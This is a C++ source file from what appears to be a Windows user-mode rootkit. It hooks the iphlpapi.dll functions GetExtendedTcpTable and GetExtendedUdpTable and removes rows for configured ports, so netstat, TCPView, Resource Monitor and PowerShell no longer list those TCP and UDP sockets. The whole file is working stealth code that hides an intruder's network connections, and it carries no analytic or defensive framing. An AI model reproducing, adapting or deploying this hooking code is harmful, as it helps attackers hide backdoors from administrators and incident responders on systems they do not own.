/*
 * hide_net.cpp - Hide sockets from the Winsock helper APIs.
 *
 * Hooks the two table exporters in iphlpapi.dll:
 *
 *   DWORD GetExtendedTcpTable(PVOID table, PDWORD size, BOOL order,
 *                             ULONG af, ULONG table_class, ULONG reserved);
 *   DWORD GetExtendedUdpTable(PVOID table, PDWORD size, BOOL order,
 *                             ULONG af, ULONG table_class, ULONG reserved);
 *
 * Both callers (netstat -ano, TCPView, Resource Monitor,
 * Get-NetTCPConnection, ...) receive a buffer that starts with a DWORD
 * row count followed by a packed array of rows. Rows whose LOCAL port
 * matches a [HidePort] entry are removed in place: the tail of the table
 * is shifted over the hole and dwNumEntries is decremented, so consumers
 * walk a gap-free table with correct row counts.
 *
 * dwLocalPort/dwRemotePort in these rows are documented as being in
 * network byte order in the low 16 bits, hence rk_port() below.
 *
 * The module is not permanently present in most host processes: when
 * iphlpapi.dll is not loaded yet the installer returns 1 and the DLL's
 * module watcher (dllmain.cpp) retries after the module appears.
 */
#include "rkhooks.h"
#include "api.h"
#include "../common/rknt.h"
#include "../common/hook.h"
#include "../common/config.h"

#include <stddef.h>
#include <string.h>

/* ================================================================== */
/* Table classes and address families                                  */
/* ================================================================== */

/* MIB_IPPROTO / MIB_TCP_TABLE_CLASS values (iprtrmib.h) */
#define RK_TCP_TABLE_BASIC_LISTENER        0
#define RK_TCP_TABLE_BASIC_CONNECTIONS     1
#define RK_TCP_TABLE_BASIC_ALL             2
#define RK_TCP_TABLE_OWNER_PID_LISTENER    3
#define RK_TCP_TABLE_OWNER_PID_CONNECTIONS 4
#define RK_TCP_TABLE_OWNER_PID_ALL         5
#define RK_TCP_TABLE_OWNER_MODULE_LISTENER    6
#define RK_TCP_TABLE_OWNER_MODULE_CONNECTIONS 7
#define RK_TCP_TABLE_OWNER_MODULE_ALL         8

#define RK_UDP_TABLE_BASIC        0
#define RK_UDP_TABLE_OWNER_PID    1
#define RK_UDP_TABLE_OWNER_MODULE 2

#define RK_AF_INET   2
#define RK_AF_INET6  23

#ifndef NO_ERROR
#define NO_ERROR 0
#endif

/* ================================================================== */
/* IPv6 row layouts                                                    */
/* ================================================================== */

/*
 * rknt.h only carries the IPv4 api tables plus a v6 basic row. The v6
 * "owner" rows have the same total size as their IPv4 counterparts plus
 * the 16-byte address, so declare them here. Field order and widths
 * mirror the platform headers (MIB_TCP6ROW_OWNER_*), the alignment is
 * naturally 4 which is what the API emits.
 */
typedef struct _RK_TCP6ROW_OWNER_PID {
    UCHAR         LocalAddr[16];
    DWORD         dwLocalScopeId;
    DWORD         dwLocalPort;
    UCHAR         RemoteAddr[16];
    DWORD         dwRemoteScopeId;
    DWORD         dwRemotePort;
    DWORD         dwState;
    DWORD         dwOwningPid;
} RK_TCP6ROW_OWNER_PID;                 /* 56 bytes */

typedef struct _RK_TCP6ROW_OWNER_MODULE {
    UCHAR         LocalAddr[16];
    DWORD         dwLocalScopeId;
    DWORD         dwLocalPort;
    UCHAR         RemoteAddr[16];
    DWORD         dwRemoteScopeId;
    DWORD         dwRemotePort;
    DWORD         dwState;
    DWORD         dwOwningPid;
    LARGE_INTEGER liCreateTimestamp;
    ULONGLONG     OwningModuleInfo[16];
} RK_TCP6ROW_OWNER_MODULE;              /* 192 bytes */

typedef struct _RK_UDP6ROW {
    UCHAR         LocalAddr[16];
    DWORD         dwLocalScopeId;
    DWORD         dwLocalPort;
} RK_UDP6ROW;                           /* 24 bytes */

typedef struct _RK_UDP6ROW_OWNER_PID {
    UCHAR         LocalAddr[16];
    DWORD         dwLocalScopeId;
    DWORD         dwLocalPort;
    DWORD         dwOwningPid;
} RK_UDP6ROW_OWNER_PID;                 /* 28 bytes */

typedef struct _RK_UDP6ROW_OWNER_MODULE {
    UCHAR         LocalAddr[16];
    DWORD         dwLocalScopeId;
    DWORD         dwLocalPort;
    DWORD         dwOwningPid;
    LARGE_INTEGER liCreateTimestamp;
    ULONGLONG     OwningModuleInfo[16];
} RK_UDP6ROW_OWNER_MODULE;              /* 164 bytes */

/* ================================================================== */
/* Row geometry                                                        */
/* ================================================================== */

typedef struct rk_table_layout {
    int            valid;
    unsigned long  row_size;
    unsigned long  port_off;
} rk_table_layout;

static void layout_set(rk_table_layout *l, unsigned long row_size,
                       unsigned long port_off)
{
    l->valid    = 1;
    l->row_size = row_size;
    l->port_off = port_off;
}

static rk_table_layout tcp_layout(ULONG cls, ULONG af)
{
    rk_table_layout l = { 0, 0, 0 };

    if (af == RK_AF_INET)
    {
        switch (cls)
        {
        case RK_TCP_TABLE_BASIC_LISTENER:
        case RK_TCP_TABLE_BASIC_CONNECTIONS:
        case RK_TCP_TABLE_BASIC_ALL:
            layout_set(&l, (unsigned long)sizeof(RK_MIB_TCPROW),
                       (unsigned long)offsetof(RK_MIB_TCPROW, dwLocalPort));
            break;
        case RK_TCP_TABLE_OWNER_PID_LISTENER:
        case RK_TCP_TABLE_OWNER_PID_CONNECTIONS:
        case RK_TCP_TABLE_OWNER_PID_ALL:
            layout_set(&l, (unsigned long)sizeof(RK_MIB_TCPROW_OWNER_PID),
                       (unsigned long)offsetof(RK_MIB_TCPROW_OWNER_PID, dwLocalPort));
            break;
        case RK_TCP_TABLE_OWNER_MODULE_LISTENER:
        case RK_TCP_TABLE_OWNER_MODULE_CONNECTIONS:
        case RK_TCP_TABLE_OWNER_MODULE_ALL:
            layout_set(&l, (unsigned long)sizeof(RK_MIB_TCPROW_OWNER_MODULE),
                       (unsigned long)offsetof(RK_MIB_TCPROW_OWNER_MODULE, dwLocalPort));
            break;
        default:
            break;
        }
    }
    else if (af == RK_AF_INET6)
    {
        switch (cls)
        {
        case RK_TCP_TABLE_BASIC_LISTENER:
        case RK_TCP_TABLE_BASIC_CONNECTIONS:
        case RK_TCP_TABLE_BASIC_ALL:
            layout_set(&l, (unsigned long)sizeof(RK_MIB_TCP6ROW),
                       (unsigned long)offsetof(RK_MIB_TCP6ROW, dwLocalPort));
            break;
        case RK_TCP_TABLE_OWNER_PID_LISTENER:
        case RK_TCP_TABLE_OWNER_PID_CONNECTIONS:
        case RK_TCP_TABLE_OWNER_PID_ALL:
            layout_set(&l, (unsigned long)sizeof(RK_TCP6ROW_OWNER_PID),
                       (unsigned long)offsetof(RK_TCP6ROW_OWNER_PID, dwLocalPort));
            break;
        case RK_TCP_TABLE_OWNER_MODULE_LISTENER:
        case RK_TCP_TABLE_OWNER_MODULE_CONNECTIONS:
        case RK_TCP_TABLE_OWNER_MODULE_ALL:
            layout_set(&l, (unsigned long)sizeof(RK_TCP6ROW_OWNER_MODULE),
                       (unsigned long)offsetof(RK_TCP6ROW_OWNER_MODULE, dwLocalPort));
            break;
        default:
            break;
        }
    }
    return l;
}

static rk_table_layout udp_layout(ULONG cls, ULONG af)
{
    rk_table_layout l = { 0, 0, 0 };

    if (af == RK_AF_INET)
    {
        switch (cls)
        {
        case RK_UDP_TABLE_BASIC:
            layout_set(&l, (unsigned long)sizeof(RK_MIB_UDPROW),
                       (unsigned long)offsetof(RK_MIB_UDPROW, dwLocalPort));
            break;
        case RK_UDP_TABLE_OWNER_PID:
            layout_set(&l, (unsigned long)sizeof(RK_MIB_UDPROW_OWNER_PID),
                       (unsigned long)offsetof(RK_MIB_UDPROW_OWNER_PID, dwLocalPort));
            break;
        case RK_UDP_TABLE_OWNER_MODULE:
            layout_set(&l, (unsigned long)sizeof(RK_MIB_UDPROW_OWNER_MODULE),
                       (unsigned long)offsetof(RK_MIB_UDPROW_OWNER_MODULE, dwLocalPort));
            break;
        default:
            break;
        }
    }
    else if (af == RK_AF_INET6)
    {
        switch (cls)
        {
        case RK_UDP_TABLE_BASIC:
            layout_set(&l, (unsigned long)sizeof(RK_UDP6ROW),
                       (unsigned long)offsetof(RK_UDP6ROW, dwLocalPort));
            break;
        case RK_UDP_TABLE_OWNER_PID:
            layout_set(&l, (unsigned long)sizeof(RK_UDP6ROW_OWNER_PID),
                       (unsigned long)offsetof(RK_UDP6ROW_OWNER_PID, dwLocalPort));
            break;
        case RK_UDP_TABLE_OWNER_MODULE:
            layout_set(&l, (unsigned long)sizeof(RK_UDP6ROW_OWNER_MODULE),
                       (unsigned long)offsetof(RK_UDP6ROW_OWNER_MODULE, dwLocalPort));
            break;
        default:
            break;
        }
    }
    return l;
}

/* ================================================================== */
/* Port helpers                                                        */
/* ================================================================== */

/* dwLocalPort is network byte order in the low 16 bits. */
static unsigned short rk_ntohs16(unsigned long raw)
{
    unsigned short n = (unsigned short)(raw & 0xFFFF);
    return (unsigned short)(((n & 0x00FF) << 8) | ((n & 0xFF00) >> 8));
}

static int port_hidden(const rk_config *cfg, unsigned short port)
{
    int i;
    for (i = 0; i < cfg->port_count; ++i)
        if (cfg->ports[i] == port)
            return 1;
    return 0;
}

/*
 * Compact the table in place. The row size comes from the requested
 * class, never from the buffer contents, so a malformed response cannot
 * make us walk outside the caller's allocation: the caller has already
 * told us how many bytes it owns via pdwSize.
 */
static void rk_filter_table(rk_config *cfg, void *table,
                            DWORD table_bytes, rk_table_layout l)
{
    DWORD         *count;
    unsigned char *rows;
    DWORD          n, i, out;

    if (!table || !l.valid || table_bytes < sizeof(DWORD))
        return;

    count = (DWORD *)table;
    n     = *count;
    rows  = (unsigned char *)table + sizeof(DWORD);

    /* Refuse to touch a table that does not fit in the caller's buffer. */
    if (n == 0 || (unsigned long long)sizeof(DWORD) +
                  (unsigned long long)n * l.row_size > table_bytes)
        return;

    out = 0;
    for (i = 0; i < n; ++i)
    {
        unsigned char *row = rows + (size_t)i * l.row_size;
        unsigned long  raw = *(unsigned long *)(void *)(row + l.port_off);

        if (port_hidden(cfg, rk_ntohs16(raw)))
            continue;

        if (out != i)
            memmove(rows + (size_t)out * l.row_size, row, l.row_size);
        ++out;
    }

    *count = out;
}

/* ================================================================== */
/* Hooks                                                               */
/* ================================================================== */

typedef DWORD (WINAPI *RK_pfn_GetExtendedTcpTable)(
    PVOID Table, PDWORD Size, BOOL Order, ULONG Af, ULONG TableClass,
    ULONG Reserved);

typedef DWORD (WINAPI *RK_pfn_GetExtendedUdpTable)(
    PVOID Table, PDWORD Size, BOOL Order, ULONG Af, ULONG TableClass,
    ULONG Reserved);

static RK_pfn_GetExtendedTcpTable Real_GetExtendedTcpTable = NULL;
static RK_pfn_GetExtendedUdpTable Real_GetExtendedUdpTable = NULL;

static DWORD WINAPI Hooked_GetExtendedTcpTable(
    PVOID Table, PDWORD Size, BOOL Order, ULONG Af, ULONG TableClass,
    ULONG Reserved)
{
    DWORD st = Real_GetExtendedTcpTable(Table, Size, Order, Af, TableClass,
                                        Reserved);

    if (st == NO_ERROR && Table && Size)
    {
        rk_config cfg;
        rk_config_snapshot(&cfg);
        if (cfg.port_count)
            rk_filter_table(&cfg, Table, *Size, tcp_layout(TableClass, Af));
    }
    return st;
}

static DWORD WINAPI Hooked_GetExtendedUdpTable(
    PVOID Table, PDWORD Size, BOOL Order, ULONG Af, ULONG TableClass,
    ULONG Reserved)
{
    DWORD st = Real_GetExtendedUdpTable(Table, Size, Order, Af, TableClass,
                                        Reserved);

    if (st == NO_ERROR && Table && Size)
    {
        rk_config cfg;
        rk_config_snapshot(&cfg);
        if (cfg.port_count)
            rk_filter_table(&cfg, Table, *Size, udp_layout(TableClass, Af));
    }
    return st;
}

/* ================================================================== */
/* Install                                                             */
/* ================================================================== */

extern "C" int rk_hide_network_install(void)
{
    static volatile LONG g_tcp = 0;
    static volatile LONG g_udp = 0;
    void *target, *orig;
    int   rc, rc2;
    HMODULE iphlp;

    if (g_tcp && g_udp)
        return 0;

    iphlp = rk_module_handle(L"iphlpapi.dll");
    if (!iphlp)
        return 1;   /* not loaded in this process yet; watcher retries */

    rc = 0;
    if (!g_tcp)
    {
        target = rk_proc(L"iphlpapi.dll", "GetExtendedTcpTable");
        if (!target)
            return 1;

        if (InterlockedExchange(&g_tcp, 1) == 0)
        {
            rc = rk_hook(target, (void *)&Hooked_GetExtendedTcpTable, &orig);
            if (rc != 0)
            {
                g_tcp = 0;
                return rc;
            }
            Real_GetExtendedTcpTable = (RK_pfn_GetExtendedTcpTable)orig;
        }
    }

    if (!g_udp)
    {
        target = rk_proc(L"iphlpapi.dll", "GetExtendedUdpTable");
        if (!target)
            return 1;

        if (InterlockedExchange(&g_udp, 1) == 0)
        {
            rc2 = rk_hook(target, (void *)&Hooked_GetExtendedUdpTable, &orig);
            if (rc2 != 0)
            {
                g_udp = 0;
                /* TCP side is already live; report the UDP failure only if
                 * nothing at all could be installed. */
                if (rc == 0)
                    rc = rc2;
            }
            else
            {
                Real_GetExtendedUdpTable = (RK_pfn_GetExtendedUdpTable)orig;
            }
        }
    }

    return rc;
}
